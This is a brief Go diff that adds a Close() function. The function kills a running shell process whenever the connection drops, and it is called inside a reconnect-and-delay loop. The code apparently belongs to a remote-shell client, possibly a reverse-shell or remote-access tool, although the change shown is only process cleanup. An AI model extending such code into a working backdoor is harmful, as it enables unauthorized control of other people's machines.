@@ -73,7 +73,15 @@ func start(config common.BinaryConfig) {
 		}
 
 	end:
-
+		Close()
 		time.Sleep(time.Second * time.Duration(config.Delay))
+	}
+}
+
+// Close is called when connection is lost
+func Close() {
+	// Kill any running shell
+	if current.process != nil {
+		current.process.Process.Kill()
 	}
 }
